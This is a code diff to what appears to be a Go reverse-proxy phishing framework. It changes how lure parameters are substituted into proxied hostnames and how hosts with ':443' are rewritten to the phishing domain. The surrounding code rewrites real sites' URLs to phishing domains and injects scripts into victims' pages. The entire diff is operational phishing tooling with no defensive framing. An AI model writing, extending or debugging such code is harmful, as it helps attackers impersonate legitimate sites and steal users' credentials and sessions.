@@ -512,6 +512,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_hostname := strings.ToLower(resp.Request.Host)
+			
+			var js_params *map[string]string = nil
+			if s.PhishLure != nil {
+				js_params = &s.PhishLure.Params
+			}
 
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
@@ -595,7 +600,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									re_s := sf.regexp
 									replace_s := sf.replace
 									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+									phish_hostname = patchPlaceholder(phish_hostname, js_params)
 									phish_sub, _ := p.getPhishSub(phish_hostname)
+									phish_sub = patchPlaceholder(phish_sub, js_params)
 
 									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
@@ -625,6 +632,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// handle auto filters (if enabled)
 						if stringExists(mime, p.auto_filter_mimes) {
 							for _, ph := range pl.proxyHosts {
+								ph.orig_subdomain = patchPlaceholder(ph.orig_subdomain, js_params)
+								ph.domain = patchPlaceholder(ph.domain, js_params)
 								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
 									if ph.auto_filter {
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
@@ -636,7 +645,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				if stringExists(mime, []string{"text/html"}) {
-
 					if pl != nil && ps.SessionId != "" {
 						s, ok := p.sessions[ps.SessionId]
 						if ok {
@@ -664,10 +672,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-							var js_params *map[string]string = nil
-							if s.PhishLure != nil {
-								js_params = &s.PhishLure.Params
-							}
 							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
 								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
@@ -974,7 +978,7 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				if hostname == ph.domain {
 					return prefix + phishDomain, true
 				}
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) || hostname == combineHost(ph.orig_subdomain, ph.domain)+":443" {
 					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
 				}
 			}
